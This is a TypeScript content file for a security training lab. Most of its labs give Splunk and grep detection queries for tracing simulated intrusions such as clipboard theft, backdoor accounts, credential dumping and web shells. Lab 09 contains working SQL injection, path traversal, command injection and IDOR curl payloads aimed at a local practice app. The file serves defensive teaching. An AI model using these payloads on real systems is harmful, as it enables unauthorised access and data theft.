export interface LabContent {
  overview: string[];
  artifacts: string[];
  queries: { label: string; spl: string }[];
}

export const labContent: Record<string, LabContent> = {
  "01-clipboard-theft": {
    overview: [
      "Clipboard data theft (T1115) involves an attacker monitoring or harvesting data stored in the Windows clipboard. Commonly used by banking trojans (Dridex, Emotet, TrickBot) to steal copied credentials and crypto wallet addresses.",
      "The attacker drops a malicious executable on the Finance workstation NFC-WS-041, establishes C2 communications, loads a .NET assembly to access clipboard data, and creates both a registry Run key and a scheduled task for persistence.",
      "Your job: trace the full attack chain from initial execution through exfiltration using Splunk Windows event logs and Sysmon data.",
    ],
    artifacts: [
      "Malicious executable dropped to %APPDATA% or %TEMP% — look for 4688/Sysmon EventID 1",
      "Outbound connection from the malware to external C2 IP — Sysmon EventID 3",
      "Registry Run key created for persistence — Sysmon EventID 13 / EventCode 4657",
      "Scheduled task created — EventCode 4698",
      "PowerShell loading PresentationCore or System.Windows.Forms assembly — EventCode 4104",
      "Repeated beaconing at regular intervals in network logs",
    ],
    queries: [
      {
        label: "Starting point — all activity on NFC-WS-041",
        spl: `index=windows host=NFC-WS-041
| table TimeCreated, EventCode, EventID, NewProcessName, CommandLine
| sort TimeCreated`,
      },
      {
        label: "Find the malicious executable (process creation)",
        spl: `index=windows host=NFC-WS-041 (EventCode=4688 OR EventID=1)
| where like(NewProcessName, "%\\\\AppData\\\\%")
   OR like(NewProcessName, "%\\\\Temp\\\\%")
| table TimeCreated, NewProcessName, CommandLine, ParentProcessName`,
      },
      {
        label: "Find C2 network connections",
        spl: `index=windows host=NFC-WS-041 EventID=3
| where NOT like(DestinationIp, "10.%")
  AND NOT like(DestinationIp, "192.168.%")
  AND NOT like(DestinationIp, "172.%")
| table TimeCreated, Image, DestinationIp, DestinationPort
| sort TimeCreated`,
      },
      {
        label: "Registry Run key persistence",
        spl: `index=windows host=NFC-WS-041 EventID=13
| where like(TargetObject, "%\\\\CurrentVersion\\\\Run%")
| table TimeCreated, TargetObject, Details, Image`,
      },
      {
        label: "Scheduled task creation",
        spl: `index=windows host=NFC-WS-041 EventCode=4698
| table TimeCreated, TaskName, TaskContent, SubjectUserName`,
      },
      {
        label: "PowerShell clipboard assembly load (EventCode 4104)",
        spl: `index=windows host=NFC-WS-041 EventCode=4104
| where like(ScriptBlockText, "%Clipboard%")
   OR like(ScriptBlockText, "%PresentationCore%")
   OR like(ScriptBlockText, "%System.Windows.Forms%")
| table TimeCreated, ScriptBlockText`,
      },
    ],
  },

  "02-splunk-account-creation": {
    overview: [
      "A backdoor privileged account was created on the Domain Controller NFC-SRV-DC1 outside of the approved change window. The attacker authenticated, created a new user, and added it to a privileged group.",
      "After achieving persistence, the attacker cleared the audit log to cover their tracks. Your job is to reconstruct the full timeline using Windows Security events.",
    ],
    artifacts: [
      "EventCode 4720 — new user account created",
      "EventCode 4732 — member added to security-enabled local group",
      "EventCode 4624 — logon success (check logon type and source IP)",
      "EventCode 1102 — audit log cleared",
      "EventCode 4688 — process creation showing attacker tools",
    ],
    queries: [
      {
        label: "Starting point — DC activity timeline",
        spl: `index=windows host=NFC-SRV-DC1
| table TimeCreated, EventCode, SubjectUserName, TargetUserName, CommandLine
| sort TimeCreated`,
      },
      {
        label: "New account creation",
        spl: `index=windows host=NFC-SRV-DC1 EventCode=4720
| table TimeCreated, SubjectUserName, TargetUserName, SubjectDomainName`,
      },
      {
        label: "Group membership changes",
        spl: `index=windows host=NFC-SRV-DC1 EventCode=4732
| table TimeCreated, SubjectUserName, TargetUserName, GroupName`,
      },
      {
        label: "Attacker logon — find the source IP",
        spl: `index=windows host=NFC-SRV-DC1 EventCode=4624
| where LogonType!=3 OR like(IpAddress, "185.%") OR like(IpAddress, "91.%")
| table TimeCreated, SubjectUserName, LogonType, IpAddress, WorkstationName`,
      },
      {
        label: "Audit log cleared",
        spl: `index=windows host=NFC-SRV-DC1 EventCode=1102
| table TimeCreated, SubjectUserName, SubjectDomainName`,
      },
    ],
  },

  "03-fin7-threat-hunting": {
    overview: [
      "FIN7 is a financially motivated threat actor known for spear-phishing campaigns delivering malicious Office documents. In this scenario, a phishing document opened on NFC-WS-029 triggers WINWORD.EXE spawning cmd.exe, which drops a RAT disguised as a legitimate system file.",
      "The attacker then moves laterally to the Domain Controller, accesses LSASS for credential dumping, and creates a backdoor account. Hunt the full kill chain using Sysmon process tree data.",
    ],
    artifacts: [
      "WINWORD.EXE or EXCEL.EXE spawning cmd.exe, powershell.exe, or wscript.exe — Sysmon EventID 1",
      "RAT payload written to System32 or SysWOW64 mimicking a legit filename — Sysmon EventID 11",
      "Network connection to C2 from the fake system file — Sysmon EventID 3",
      "Base64-encoded PowerShell in CommandLine — EventCode 4688",
      "LSASS memory access — Sysmon EventID 10 with GrantedAccess 0x1010 or 0x1410",
      "New account on DC shortly after lateral movement — EventCode 4720",
    ],
    queries: [
      {
        label: "Starting point — NFC-WS-029 process tree",
        spl: `index=windows host=NFC-WS-029
| table TimeCreated, EventCode, EventID, Image, CommandLine, ParentImage
| sort TimeCreated`,
      },
      {
        label: "Office application spawning suspicious child process",
        spl: `index=windows host=NFC-WS-029 EventID=1
| where (like(ParentImage, "%WINWORD%") OR like(ParentImage, "%EXCEL%"))
  AND (like(Image, "%cmd.exe%") OR like(Image, "%powershell%") OR like(Image, "%wscript%"))
| table TimeCreated, ParentImage, Image, CommandLine`,
      },
      {
        label: "Base64 PowerShell command",
        spl: `index=windows host=NFC-WS-029 (EventCode=4688 OR EventID=1)
| where like(CommandLine, "%-enc%") OR like(CommandLine, "%-EncodedCommand%")
| table TimeCreated, Image, CommandLine`,
      },
      {
        label: "Payload dropped to disk",
        spl: `index=windows host=NFC-WS-029 EventID=11
| where like(TargetFilename, "%System32%") OR like(TargetFilename, "%SysWOW64%")
| where NOT like(Image, "%System32%")
| table TimeCreated, Image, TargetFilename`,
      },
      {
        label: "C2 network connection from RAT",
        spl: `index=windows host=NFC-WS-029 EventID=3
| where NOT like(DestinationIp, "10.%") AND NOT like(DestinationIp, "192.168.%")
| table TimeCreated, Image, DestinationIp, DestinationPort`,
      },
      {
        label: "LSASS access (credential dumping)",
        spl: `index=windows host=NFC-WS-029 EventID=10
| where like(TargetImage, "%lsass%")
| table TimeCreated, SourceImage, TargetImage, GrantedAccess`,
      },
    ],
  },

  "04-packet-analysis": {
    overview: [
      "A network sensor NFC-SENSOR detected a port scan from an external IP, followed by FTP authentication in cleartext and an HTTP download of a suspicious executable.",
      "Analyse the network sensor logs in Splunk to identify the attacker IP, open ports, stolen FTP credentials, exfiltrated files, and the malware download.",
    ],
    artifacts: [
      "Port scan pattern — many unique destination ports from one source IP in a short window",
      "FTP control channel on port 21 — credentials transmitted in cleartext (USER/PASS commands)",
      "FTP data transfer — file retrieved via RETR command",
      "HTTP GET to attacker-controlled host downloading a .exe",
      "Large outbound bytes_out indicating exfiltration",
    ],
    queries: [
      {
        label: "Starting point — sensor traffic timeline",
        spl: `index=network host=NFC-SENSOR
| table TimeCreated, src_ip, dst_ip, dst_port, app, action, bytes_out, bytes_in
| sort TimeCreated`,
      },
      {
        label: "Port scan — find the scanning IP",
        spl: `index=network host=NFC-SENSOR
| stats count as port_count, values(dst_port) as ports by src_ip
| where port_count > 10
| sort -port_count`,
      },
      {
        label: "FTP cleartext credentials",
        spl: `index=network host=NFC-SENSOR app=ftp
| where like(ftp_command, "USER%") OR like(ftp_command, "PASS%")
| table TimeCreated, src_ip, dst_ip, ftp_command`,
      },
      {
        label: "File retrieved via FTP",
        spl: `index=network host=NFC-SENSOR app=ftp
| where like(ftp_command, "RETR%")
| table TimeCreated, src_ip, dst_ip, ftp_command, bytes_out`,
      },
      {
        label: "HTTP executable download",
        spl: `index=network host=NFC-SENSOR app=http
| where like(uri, "%.exe") OR like(uri, "%.ps1") OR like(uri, "%.bat")
| table TimeCreated, src_ip, dst_ip, uri, bytes_in`,
      },
    ],
  },

  "05-onenote-analysis": {
    overview: [
      "A malicious OneNote file was opened on NFC-WS-058, causing ONENOTE.EXE to spawn mshta.exe. The HTA file downloaded and executed a payload that established persistence via a registry Run key.",
      "This is a common technique used since Microsoft started blocking Office macros by default — attackers pivoted to OneNote files which can embed arbitrary attachments.",
    ],
    artifacts: [
      "ONENOTE.EXE spawning mshta.exe — Sysmon EventID 1",
      "mshta.exe making network connections — Sysmon EventID 3",
      "Payload dropped to %APPDATA% or %TEMP% — Sysmon EventID 11",
      "Registry Run key set for persistence — Sysmon EventID 13",
      "Outbound C2 connection from payload process",
    ],
    queries: [
      {
        label: "Starting point — NFC-WS-058 timeline",
        spl: `index=windows host=NFC-WS-058
| table TimeCreated, EventCode, EventID, Image, CommandLine, ParentImage
| sort TimeCreated`,
      },
      {
        label: "ONENOTE.EXE spawning mshta.exe",
        spl: `index=windows host=NFC-WS-058 EventID=1
| where like(ParentImage, "%ONENOTE%")
| table TimeCreated, ParentImage, Image, CommandLine`,
      },
      {
        label: "mshta.exe network connection",
        spl: `index=windows host=NFC-WS-058 EventID=3
| where like(Image, "%mshta%")
| table TimeCreated, Image, DestinationIp, DestinationPort`,
      },
      {
        label: "Payload dropped to disk",
        spl: `index=windows host=NFC-WS-058 EventID=11
| where like(TargetFilename, "%AppData%") OR like(TargetFilename, "%Temp%")
| table TimeCreated, Image, TargetFilename`,
      },
      {
        label: "Registry persistence",
        spl: `index=windows host=NFC-WS-058 EventID=13
| where like(TargetObject, "%Run%")
| table TimeCreated, TargetObject, Details, Image`,
      },
    ],
  },

  "06-suspicious-email": {
    overview: [
      "An HTML smuggling attack was delivered via a phishing email to NFC-WS-063. Chrome opened an HTML file from the Outlook temp directory, which used JavaScript to assemble and drop a fake application installer acting as a credential harvester.",
      "HTML smuggling bypasses email gateways because the payload is assembled client-side in the browser — the email itself contains only benign HTML and JavaScript.",
    ],
    artifacts: [
      "Chrome spawned from Outlook or opening a file from Outlook temp — Sysmon EventID 1",
      "HTML file in %LOCALAPPDATA%\\Microsoft\\Windows\\INetCache or Outlook temp",
      "Dropped executable disguised as a legitimate installer — Sysmon EventID 11",
      "Outbound connection to attacker IP exfiltrating credentials — Sysmon EventID 3",
      "Registry Run key persistence — Sysmon EventID 13",
    ],
    queries: [
      {
        label: "Starting point — NFC-WS-063 timeline",
        spl: `index=windows host=NFC-WS-063
| table TimeCreated, EventCode, EventID, Image, CommandLine, ParentImage, TargetFilename
| sort TimeCreated`,
      },
      {
        label: "Chrome opening HTML from Outlook temp",
        spl: `index=windows host=NFC-WS-063 EventID=1
| where like(Image, "%chrome%") AND like(CommandLine, "%INetCache%")
| table TimeCreated, Image, CommandLine, ParentImage`,
      },
      {
        label: "File dropped by Chrome",
        spl: `index=windows host=NFC-WS-063 EventID=11
| where like(Image, "%chrome%")
| table TimeCreated, Image, TargetFilename`,
      },
      {
        label: "Credential harvester execution + C2",
        spl: `index=windows host=NFC-WS-063 EventID=3
| where NOT like(DestinationIp, "10.%") AND NOT like(DestinationIp, "192.168.%")
| where NOT like(Image, "%chrome%") AND NOT like(Image, "%svchost%")
| table TimeCreated, Image, DestinationIp, DestinationPort`,
      },
      {
        label: "Registry persistence",
        spl: `index=windows host=NFC-WS-063 EventID=13
| where like(TargetObject, "%Run%")
| table TimeCreated, TargetObject, Details, Image`,
      },
    ],
  },

  "07-windows-soc": {
    overview: [
      "A clipboard-stealing banker trojan was detected on NFC-WS-041 (Finance Workstation — Emily Carter). The malware beacons to 45.33.32.156:443 at regular intervals, exfiltrating clipboard data including copied credentials and crypto wallet addresses.",
      "Using the PowerShell-based SOC lab environment, you will trace the malicious process from initial execution, identify C2 communications, find all persistence mechanisms (registry Run key + scheduled task), and decode the C2 traffic to capture the flag.",
      "Run the Docker lab with: cd docker/windows-soc && docker-compose up -d, then connect via: docker exec -it windows-soc pwsh",
    ],
    artifacts: [
      "Malicious process beacon to 45.33.32.156:443 — Get-NetworkConn",
      "Process dropped to %APPDATA% — Get-ProcessList",
      "Registry Run key persistence — Get-RegistryRun",
      "Scheduled task persistence — Get-ScheduledTasks",
      "Base64-encoded C2 traffic — Decode-Base64",
      "PowerShell loading clipboard assembly — Get-EventPowerShell",
    ],
    queries: [
      {
        label: "Start investigation — process list",
        spl: "Get-ProcessList",
      },
      {
        label: "Network connections to external IPs",
        spl: "Get-NetworkConn",
      },
      {
        label: "Registry Run key persistence",
        spl: "Get-RegistryRun",
      },
      {
        label: "Scheduled tasks",
        spl: "Get-ScheduledTasks",
      },
      {
        label: "Decode C2 payload to get the flag",
        spl: "Decode-Base64 -S <base64_string_from_network_capture>",
      },
    ],
  },

  "08-linux-forensics": {
    overview: [
      "Production web server NFC-SRV-WEB1 (Ubuntu 22.04) was compromised via SSH brute-force from 185.220.101.45. The attacker gained access using the weak password 'Password1!' on the webadmin account, then escalated privileges via a sudo NOPASSWD misconfiguration.",
      "After privilege escalation, the attacker downloaded a dropper to /tmp/.X11-unix/.cache, established cron persistence, dropped a PHP web shell, exfiltrated /etc/shadow, and added an SSH public key for persistent access.",
      "Run the Docker lab with: cd docker/linux-forensics && docker-compose up -d, then: docker exec -it linux-forensics bash",
    ],
    artifacts: [
      "/var/log/auth.log — SSH brute-force attempts then successful login",
      "/home/webadmin/.bash_history — full attacker command sequence",
      "/var/spool/cron/crontabs/webadmin — cron persistence",
      "/var/www/html/uploads/img001.php — PHP web shell",
      "/root/.ssh/authorized_keys — attacker SSH key",
      "/tmp/.X11-unix/.cache — hidden malware dropper with embedded flag",
    ],
    queries: [
      {
        label: "Find attacker SSH brute-force and login",
        spl: "grep 'Failed\\|Accepted' /var/log/auth.log",
      },
      {
        label: "Review attacker bash history",
        spl: "cat /home/webadmin/.bash_history",
      },
      {
        label: "Find cron persistence",
        spl: "cat /var/spool/cron/crontabs/webadmin",
      },
      {
        label: "Find PHP web shell",
        spl: "grep -r 'shell_exec\\|system\\|passthru' /var/www/",
      },
      {
        label: "Extract and decode flag from dropper",
        spl: "strings /tmp/.X11-unix/.cache | grep 'TkZD' | base64 -d",
      },
    ],
  },

  "09-kali-appsec": {
    overview: [
      "The NFC Internal Employee Portal (http://localhost:5000) has been scoped for a full web application security assessment. Three vulnerabilities have been identified: SQL Injection on /login, Path Traversal on /files, and Command Injection on /ping.",
      "Using Kali Linux tools, exploit each vulnerability to extract the hidden flags. Each successful exploitation earns points and teaches a real-world web attack technique.",
      "Run the Docker lab with: cd docker/kali-appsec && docker-compose up -d, then: docker exec -it kali-appsec bash",
    ],
    artifacts: [
      "POST /login — SQL Injection to bypass auth and read admin notes (Flag 1)",
      "GET /files?path= — Path Traversal to read /lab/flags/flag2.txt (Flag 2)",
      "GET /ping?host= — Command Injection via pipe | to read /lab/flags/flag3.txt (Flag 3)",
      "GET /user?id= — IDOR to enumerate all user profiles",
    ],
    queries: [
      {
        label: "Challenge 1 — SQL Injection auth bypass",
        spl: `curl -s -X POST http://localhost:5000/login \\
  --data-urlencode "username=' OR '1'='1'-- " \\
  --data-urlencode "password=x" | python3 -m json.tool`,
      },
      {
        label: "Challenge 2 — Path Traversal",
        spl: "curl -s 'http://localhost:5000/files?path=../flags/flag2.txt' | python3 -m json.tool",
      },
      {
        label: "Challenge 3 — Command Injection",
        spl: "curl -s 'http://localhost:5000/ping?host=127.0.0.1|cat /lab/flags/flag3.txt'",
      },
      {
        label: "IDOR — enumerate all users",
        spl: "for i in 1 2 3 4; do curl -s http://localhost:5000/user?id=$i | python3 -m json.tool; done",
      },
    ],
  },
};
